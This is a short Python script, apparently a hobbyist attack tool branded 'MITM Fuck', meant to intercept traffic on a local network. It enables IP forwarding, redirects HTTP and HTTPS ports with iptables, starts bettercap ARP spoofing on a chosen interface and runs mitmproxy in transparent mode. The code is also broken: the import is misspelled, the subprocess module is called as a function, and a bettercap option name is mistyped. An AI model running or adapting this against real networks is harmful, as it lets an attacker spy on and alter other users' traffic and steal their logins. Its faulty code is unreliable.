import subprocress

# colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m'
BLUE='\033[34;1m'

# clear screen
subprocess('clear')

# Logo 
print("")
print ('''
   ▄▄▄▄███▄▄▄▄    ▄█      ███       ▄▄▄▄███▄▄▄▄           ▄████████ ███    █▄   ▄████████    ▄█   ▄█▄ 
 ▄██▀▀▀███▀▀▀██▄ ███  ▀█████████▄ ▄██▀▀▀███▀▀▀██▄        ███    ███ ███    ███ ███    ███   ███ ▄███▀ 
 ███   ███   ███ ███▌    ▀███▀▀██ ███   ███   ███        ███    █▀  ███    ███ ███    █▀    ███▐██▀   
 ███   ███   ███ ███▌     ███   ▀ ███   ███   ███       ▄███▄▄▄     ███    ███ ███         ▄█████▀    
 ███   ███   ███ ███▌     ███     ███   ███   ███      ▀▀███▀▀▀     ███    ███ ███        ▀▀█████▄    
 ███   ███   ███ ███      ███     ███   ███   ███        ███        ███    ███ ███    █▄    ███▐██▄   
 ███   ███   ███ ███      ███     ███   ███   ███        ███        ███    ███ ███    ███   ███ ▀███▄ 
  ▀█   ███   █▀  █▀      ▄████▀    ▀█   ███   █▀         ███        ████████▀  ████████▀    ███   ▀█▀ 
                                                                                            ▀   

''')
print("")
print("[+] Code : VarelSecurity (KucingMalas)")
print("")
subprocess("ifconfig | grep -e ': ' | sed -e 's/: .*//g' | sed -e 's/^/   /'")
print ("")

interface = input(f"{YELLOW}(MITM){NC}Interface: ")


subprocess(f"sudo echo 1 > /proc/sys/net/ipv4/ip_forward")
subprocess(f"sudo iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 80 -j REDIRECT --to-port 8080 > /dev/null 2>&1 &")
subprocess(f"sudo iptables -t nat -A PREROUTING -i {interface} -p tcp --dport 443 -j REDIRECT --to-port 8080 > /dev/null 2>&1 &")
subprocess(f"sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null 2>&1")
subprocess(f"sudo xterm -title 'Bettercap' -bg '#000000' -fg '#FFFFFF' -fa 'Monospace' -fs 12 -e 'sudo bettercap -iface {interface} -eval \"net.probe on; set arp.spoof.fulldulpex true; arp.spoof on;\"' > /dev/null 2>&1 &")
subprocess(f"sudo mitmproxy --no-ssl-insecure -m transparent") 
subprocess("killall bettercap")
